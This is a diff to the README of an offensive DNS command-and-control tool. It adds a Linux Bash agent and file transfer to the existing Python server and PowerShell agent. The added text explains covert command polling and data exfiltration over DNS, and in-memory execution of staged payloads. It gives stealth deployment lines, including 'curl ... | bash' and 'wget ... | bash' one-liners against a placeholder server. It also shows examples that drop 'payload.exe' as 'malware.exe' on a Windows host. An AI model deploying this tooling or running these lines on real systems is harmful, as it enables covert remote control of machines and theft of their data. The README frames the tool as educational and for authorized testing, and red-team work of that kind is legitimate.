@@ -1,7 +1,8 @@
 # DNS C2
 
 ![Python](https://img.shields.io/badge/python-3.7+-blue)
-![PowerShell](https://img.shields.io/badge/PowerShell-5.0+-blue)
+![PowerShell](https://img.shields.io/badge/PowerShell-5.0+-purple)
+![Bash](https://img.shields.io/badge/Bash-4.0+-purple)
 ![DNS](https://img.shields.io/badge/protocol-DNS-green)
 ![BIND9](https://img.shields.io/badge/BIND9-required-orange)
 ![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey)
@@ -16,10 +17,11 @@ This tool is intended for **educational and authorized security testing purposes
 
 ## Overview
 
-DNS C2 consists of two main components:
+DNS C2 consists of three main components:
 
 - **`cli.py`**: Python-based C2 server that manages command deployment and monitors DNS logs for exfiltrated data
-- **`agent.ps1`**: PowerShell agent that polls for commands via DNS and exfiltrates results through DNS queries
+- **`agent.ps1`**: PowerShell agent for Windows systems that polls for commands via DNS and exfiltrates results through DNS queries
+- **`agent.sh`**: Bash agent for Linux systems that polls for commands via DNS and exfiltrates results through DNS queries
 
 ## Architecture
 
@@ -38,8 +40,10 @@ graph TB
     
     E -->|1. DNS TXT Query<br/>nonce.cmd.domain.com| C
     C -->|2. TXT Record<br/>CMD:ID:command| E
-    E -->|3. Execute Command| F[cmd.exe]
-    F -->|4. Output| E
+    E -->|3a. Execute Command| F[cmd.exe]
+    F -->|4a. Output| E
+    E -->|3b. File Transfer<br/>n.fileid.dl.domain.com| C
+    C -->|4b. TXT Records<br/>File Fragments| E
     E -->|5. DNS A Queries<br/>seq-total-cmdid-hexdata.session.data.domain.com| C
     C -->|6. Log Queries| D
     A -->|7. Reassemble & Decode| G[Command Output Files]
@@ -60,8 +64,9 @@ graph TB
 - **Output persistence**: Automatically saves decoded command outputs to disk
 - **Interactive CLI**: User-friendly interface with colored output and status tracking
 - **State recovery**: Processes existing logs on startup to recover previous sessions
+- **File transfer**: Stage files for agent download via DNS TXT records
 
-### Agent (`agent.ps1`)
+### Windows Agent (`agent.ps1`)
 
 - **DNS-based polling**: Checks for commands via DNS TXT record queries
 - **Hex encoding**: Encodes command output in hexadecimal for DNS compatibility
@@ -70,6 +75,27 @@ graph TB
 - **Retry logic**: Automatic retry mechanism for failed DNS queries
 - **Nonce-based queries**: Uses random nonces to avoid DNS caching
 - **Configurable parameters**: Sleep intervals, chunk size, and domain settings
+- **File download**: Download staged files from C2 via DNS TXT records
+- **In-memory execution**: Execute downloaded scripts directly in memory
+- **File push**: Save downloaded files to specified destination paths
+- **Smart path handling**: Automatically appends filename when destination is a directory
+
+### Linux Agent (`agent.sh`)
+
+- **Native tools only**: Uses only standard Linux utilities (`dig`/`nslookup`/`host`, `xxd`, `gzip`, `base64`) for maximum stealth
+- **DNS-based polling**: Checks for commands via DNS TXT record queries using native DNS tools
+- **Hex encoding**: Encodes command output using `xxd` for DNS compatibility
+- **Chunked exfiltration**: Splits large outputs into DNS-safe fragments
+- **Fragment ordering**: Includes sequence numbers for reliable reassembly
+- **Retry logic**: Automatic retry mechanism for failed DNS queries
+- **Nonce-based queries**: Uses `/dev/urandom` for random nonces to avoid DNS caching
+- **Configurable parameters**: Sleep intervals, chunk size, and domain settings
+- **File download**: Download staged files from C2 via DNS TXT records
+- **Multi-language execution**: Execute Bash, Python, or Perl scripts in memory
+- **File push**: Save downloaded files to specified destination paths
+- **Smart path handling**: Automatically appends filename when destination is a directory
+- **Graceful signal handling**: Clean exit on SIGINT/SIGTERM
+- **Tool availability check**: Verifies required tools on startup
 
 ## How It Works
 
@@ -126,6 +152,71 @@ sequenceDiagram
     CLI->>CLI: Save to file
 ```
 
+### File Transfer Flow
+
+The C2 supports transferring files from the server to agents using DNS TXT records. Files are compressed, encoded, and split into fragments that fit within DNS TXT record limits.
+
+```mermaid
+sequenceDiagram
+    participant Operator
+    participant CLI
+    participant BIND
+    participant Agent
+    
+    Operator->>CLI: EXEC:payload.ps1
+    CLI->>CLI: Read & Compress File (gzip)
+    CLI->>CLI: Base64 Encode
+    CLI->>CLI: Split into Fragments (220 chars each)
+    CLI->>CLI: Generate File ID (8 hex chars)
+    CLI->>BIND: Add TXT Records to Zone
+    Note right of BIND: 0.{id}.dl = metadata<br/>1.{id}.dl = fragment1<br/>2.{id}.dl = fragment2<br/>...
+    CLI->>BIND: rndc reload
+    CLI->>BIND: Deploy CMD: EXEC:{id}
+    
+    Agent->>BIND: TXT Query: nonce.cmd.domain.com
+    BIND-->>Agent: "CMD:1:EXEC:abc12345"
+    
+    Agent->>BIND: TXT Query: 0.abc12345.dl.domain.com
+    BIND-->>Agent: Metadata: "EXEC|5|checksum|payload.ps1|"
+    
+    loop For each fragment
+        Agent->>BIND: TXT Query: {n}.abc12345.dl.domain.com
+        BIND-->>Agent: Fragment data
+    end
+    
+    Agent->>Agent: Reassemble & Decompress
+    Agent->>Agent: Verify Checksum
+    Agent->>Agent: Execute in Memory
+    Agent->>BIND: Exfiltrate Result
+```
+
+### File Transfer Record Structure
+
+**Metadata Record (fragment 0):**
+```
+0.<file_id>.dl.<base_domain> IN TXT "<action>|<total_fragments>|<checksum>|<filename>|<destination>"
+```
+
+**Fragment Records:**
+```
+<n>.<file_id>.dl.<base_domain> IN TXT "<base64_fragment>"
+```
+
+**Example Zone Records:**
+```bind
+0.abc12345.dl IN TXT "EXEC|3|a1b2c3d4|payload.ps1|"
+1.abc12345.dl IN TXT "H4sIAAAAAAAAA6tWKkktLlGyUlAqS8wpTtVRyk..."
+2.abc12345.dl IN TXT "xNzE3NTcwMDYyMDMyMzI0MTkwMjEyNDAwNTA..."
+3.abc12345.dl IN TXT "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..."
+```
+
+**Actions:**
+| Action | Description |
+|--------|-------------|
+| `EXEC` | Download and execute script in memory (PowerShell) |
+| `PUSH` | Download and save file to specified destination path |
+| `STAGED` | File is staged but no automatic action (manual deployment) |
+
 ### Fragment Structure
 
 Each exfiltrated DNS query follows this pattern:
@@ -155,8 +246,13 @@ Each exfiltrated DNS query follows this pattern:
 - Python 3.7+
 - Root/sudo access for BIND configuration and reload
 
-**Agent:**
+**Windows Agent:**
 - Windows system with PowerShell 3.0+
+- Network access to the C2 DNS server
+
+**Linux Agent:**
+- Linux system with Bash 4.0+
+- Standard utilities: `dig` or `nslookup` or `host`, `xxd`, `gzip`, `base64`, `md5sum`
 - Network access to the C2 DNS server
 
 ### C2 Server Setup
@@ -253,7 +349,7 @@ Each exfiltrated DNS query follows this pattern:
    sudo python3 cli.py
    ```
 
-### Agent Deployment
+### Windows Agent Deployment
 
 1. **Configure agent** (edit `agent.ps1`):
    ```powershell
@@ -273,18 +369,67 @@ Each exfiltrated DNS query follows this pattern:
    powershell.exe -ExecutionPolicy Bypass -File agent.ps1
    ```
 
+### Linux Agent Deployment
+
+1. **Configure agent** (edit `agent.sh`):
+   ```bash
+   BASE_DOMAIN="domain.com"
+   COMMAND_SUBDOMAIN="cmd"
+   DATA_SUBDOMAIN="data"
+   SLEEP_TIME_SECONDS=15
+   EXFIL_CHUNK_SIZE=50
+   ```
+
+2. **Deploy to target** (ensure DNS resolves to your C2 server):
+   ```bash
+   # Test DNS resolution first
+   dig TXT cmd.domain.com
+
+   # Run agent (method 1: direct execution)
+   chmod +x agent.sh && ./agent.sh
+
+   # Run agent (method 2: via bash)
+   bash agent.sh
+
+   # Run agent in background (stealth)
+   nohup ./agent.sh > /dev/null 2>&1 &
+
+   # One-liner download and execute (curl)
+   curl -s http://yourserver/agent.sh | bash
+
+   # One-liner download and execute (wget)
+   wget -qO- http://yourserver/agent.sh | bash
+   ```
+
 ## Usage
 
 ### C2 CLI Commands
 
 | Command | Description |
 |---------|-------------|
-| `CMD:<command>` | Deploy a command to all agents (e.g., `CMD:whoami`) |
+| `CMD:<command>` | Deploy a shell command to all agents (e.g., `CMD:whoami`) |
+| `EXEC:<file>` | Stage file and execute in memory on agent |
+| `PUSH:<file>:<dest>` | Stage file and save to destination path on agent (supports directories) |
+| `STAGE:<file>` | Stage file without deploying command (for manual deployment) |
+| `UNSTAGE:<id>` | Remove staged file from DNS zone |
+| `staged` | List all currently staged files |
 | `show` | Display all exfiltrated data and session status |
 | `status` | Show current C2 status (sessions, fragments, command counter) |
 | `clear` | Clear the screen |
 | `help` | Display help menu |
 | `exit` / `quit` | Exit the CLI |
+
+**PUSH Command Examples:**
+```bash
+# Save to specific file path
+PUSH:payload.exe:C:\Users\Public\malware.exe
+
+# Save to directory (filename preserved)
+PUSH:payload.exe:C:\Users\Public\Desktop
+
+# Save to directory with trailing slash
+PUSH:payload.exe:C:\Users\Public\Desktop\
+```
 
 ### Example Session
 
@@ -294,23 +439,35 @@ Starting the C2 server and loading existing logs:
 
 ![CLI Startup](./imgs/img1.png)
 
-**2. Deploying a Command**
+**2. Commands Available**
+
+Displaying the help command:
+
+![Help Command](./imgs/img2.png)
+
+**3. Deploying a Command**
 
 Sending a command to all agents:
 
-![Command Deployment](./imgs/img2.png)
+![Command Deployment](./imgs/img3.png)
 
-**3. Agent Execution**
+**4. Agent Execution**
 
 Agent receiving and executing the command:
 
-![Agent Execution](./imgs/img3.png)
+![Agent Execution](./imgs/img4.png)
 
-**4. Viewing Exfiltrated Data**
+**5. Viewing Exfiltrated Data**
 
 Using the `show` command to display all received data:
 
-![Show Command Output](./imgs/img4.png)
+![Show Command Output](./imgs/img5.png)
+
+**6. Transfering a file and executing it**
+
+Using the `EXEC:<file>` command to transfer and execute a file:
+
+![Transfer And Exec](./imgs/img6.png)
 
 ## Technical Details
 
@@ -328,6 +485,14 @@ Using the `show` command to display all received data:
 - Fragment delay: 3 seconds
 - Max chunk size: Configurable (default: 50 hex chars = 25 bytes)
 
+**File Download (Agent ← C2):**
+- Type: TXT
+- Metadata Pattern: `0.<file_id>.dl.domain.com`
+- Fragment Pattern: `<n>.<file_id>.dl.domain.com`
+- Max TXT record size: 220 characters per fragment
+- Compression: gzip (level 9)
+- Encoding: Base64
+
 ### Encoding Scheme
 
 1. Command output is captured as UTF-8 text
@@ -335,6 +500,22 @@ Using the `show` command to display all received data:
 3. Hex string is split into chunks of `$ExfilChunkSize`
 4. Each chunk is transmitted as a DNS subdomain label
 5. C2 server reassembles and decodes hex back to UTF-8
+
+### Windows Path Handling
+
+Windows paths require special handling due to DNS TXT record escaping:
+
+1. **C2 Server**: Backslashes (`\`) are escaped to `\\` before writing to DNS zone
+2. **Agent**: Escaped backslashes are converted back to single backslashes when parsing metadata
+3. **Directory Detection**: If destination is an existing directory or ends with `\`/`/`, the original filename is appended
+
+**Example Flow:**
+```
+Operator Input:     PUSH:test.txt:C:\Users\Public\Desktop
+Zone File:          "PUSH|1|abc123|test.txt|C:\\Users\\Public\\Desktop"
+Agent Receives:     C:\Users\Public\Desktop
+Final Path:         C:\Users\Public\Desktop\test.txt
+```
 
 ### State Machine
 
@@ -346,10 +527,28 @@ stateDiagram-v2
     CheckIn --> ParseCommand: TXT Record Received
     CheckIn --> Idle: No TXT / Same Command ID
     
-    ParseCommand --> Execute: New Command ID
-    Execute --> Encode: Command Output
-    Encode --> Fragment: Hex Encoded
+    ParseCommand --> Execute: Shell Command
+    ParseCommand --> DownloadFileExec: EXEC Command
+    ParseCommand --> DownloadFilePush: PUSH Command
     
+    Execute --> Encode: Command Output
+    
+    DownloadFileExec --> FetchMetadataExec: Get file info
+    DownloadFilePush --> FetchMetadataPush: Get file info
+    FetchMetadataExec --> FetchFragmentsExec: Parse metadata
+    FetchMetadataPush --> FetchFragmentsPush: Parse metadata
+    FetchFragmentsExec --> FetchFragmentsExec: Next fragment
+    FetchFragmentsPush --> FetchFragmentsPush: Next fragment
+    FetchFragmentsExec --> DecompressExec: All fragments received
+    FetchFragmentsPush --> DecompressPush: All fragments received
+    DecompressExec --> VerifyChecksumExec: gzip decompress
+    DecompressPush --> VerifyChecksumPush: gzip decompress
+    VerifyChecksumExec --> ExecuteScript: EXEC action
+    VerifyChecksumPush --> SaveFile: PUSH action
+    ExecuteScript --> Encode: Script output
+    SaveFile --> Encode: Save result
+    
+    Encode --> Fragment: Hex Encoded
     Fragment --> SendFragment: For each chunk
     SendFragment --> SendFragment: Next Fragment
     SendFragment --> Idle: All Fragments Sent
@@ -364,6 +563,19 @@ stateDiagram-v2
     note right of CheckIn
         Uses random nonce to
         bypass DNS caching
+    end note
+    
+    note right of FetchFragmentsExec
+        Retry logic:
+        - Max 3 attempts per fragment
+        - 500ms delay between retries
+        - 100ms delay between fragments
+    end note
+    note right of FetchFragmentsPush
+        Retry logic:
+        - Max 3 attempts per fragment
+        - 500ms delay between retries
+        - 100ms delay between fragments
     end note
 ```
 
@@ -405,15 +617,27 @@ stateDiagram-v2
 
 ## Configuration Options
 
-### Agent Configuration
+### Windows Agent Configuration (`agent.ps1`)
 
 | Variable | Default | Description |
 |----------|---------|-------------|
 | `$BaseDomain` | `"domain.com"` | Base domain for DNS queries |
 | `$CommandSubdomain` | `"cmd"` | Subdomain for command polling |
 | `$DataSubdomain` | `"data"` | Subdomain for data exfiltration |
+| `$DownloadSubdomain` | `"dl"` | Subdomain for file downloads |
 | `$SleepTimeSeconds` | `15` | Polling interval in seconds |
 | `$ExfilChunkSize` | `50` | Hex characters per DNS fragment |
+
+### Linux Agent Configuration (`agent.sh`)
+
+| Variable | Default | Description |
+|----------|---------|-------------|
+| `BASE_DOMAIN` | `"domain.com"` | Base domain for DNS queries |
+| `COMMAND_SUBDOMAIN` | `"cmd"` | Subdomain for command polling |
+| `DATA_SUBDOMAIN` | `"data"` | Subdomain for data exfiltration |
+| `DOWNLOAD_SUBDOMAIN` | `"dl"` | Subdomain for file downloads |
+| `SLEEP_TIME_SECONDS` | `15` | Polling interval in seconds |
+| `EXFIL_CHUNK_SIZE` | `50` | Hex characters per DNS fragment |
 
 ### CLI Configuration
 
@@ -432,8 +656,11 @@ stateDiagram-v2
 - **No Encryption**: Data is only hex-encoded, not encrypted (visible in DNS logs)
 - **No Authentication**: No agent authentication mechanism
 - **Single Command**: Agents can only process one command at a time
-- **Windows Only**: Agent requires Windows/PowerShell
 - **Detection Risk**: DNS tunneling patterns are detectable by modern security tools
+- **TXT Record Size**: File transfer limited by 220 char fragments, larger files require more DNS queries
+- **File Transfer Speed**: File downloads are sequential and include delays to avoid detection
+- **Write-Host Limitation** (Windows): Scripts using `Write-Host` instead of `Write-Output` won't have their output captured
+- **Tool Dependencies** (Linux): Requires standard utilities (`dig`/`nslookup`/`host`, `xxd`, `gzip`, `base64`) to be present
 
 ## Detection
 
